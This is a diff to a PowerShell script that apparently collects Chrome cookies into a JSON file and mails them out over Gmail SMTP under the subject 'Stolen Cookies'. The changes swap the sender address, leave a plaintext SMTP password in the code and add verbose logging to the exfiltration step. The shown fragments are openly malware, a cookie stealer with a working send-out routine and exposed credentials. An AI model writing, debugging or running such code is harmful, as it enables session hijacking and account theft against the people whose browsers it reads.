@@ -5,7 +5,7 @@ $chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
 $outputFile = ".\Chrome-Cookies.json"
 $smtpServer = "smtp.gmail.com"
 $smtpPort = 587
-$smtpUser = "fromsmtpmail@gmail.com"
+$smtpUser = "silvermo2010@gmail.com"
 $smtpPassword = "No9KqH4Yruua7jOP"
 
 # Function to quit Chrome process
@@ -148,11 +148,12 @@ $smtpSecurePassword = ConvertTo-SecureString $smtpPassword -AsPlainText -Force
 $smtpCredential = New-Object System.Management.Automation.PSCredential($smtpUser, $smtpSecurePassword)
 
 try {
-    Send-MailMessage -From $smtpUser -To $toMail -Subject "Stolen Cookies" -Body $cookiesJson -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential $smtpCredential
+    Write-Host "Attempting to send email..."
+    Send-MailMessage -From $smtpUser -To $toMail -Subject "Stolen Cookies" -Body $cookiesJson -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential $smtpCredential -Verbose
     Write-Host "Email sent successfully."
-}
-catch {
-    Write-Error "Failed to send email: $_"
+} catch {
+    Write-Error "Failed to send email. Error details:"
+    Write-Error $_
 }
 
 # Cleanup
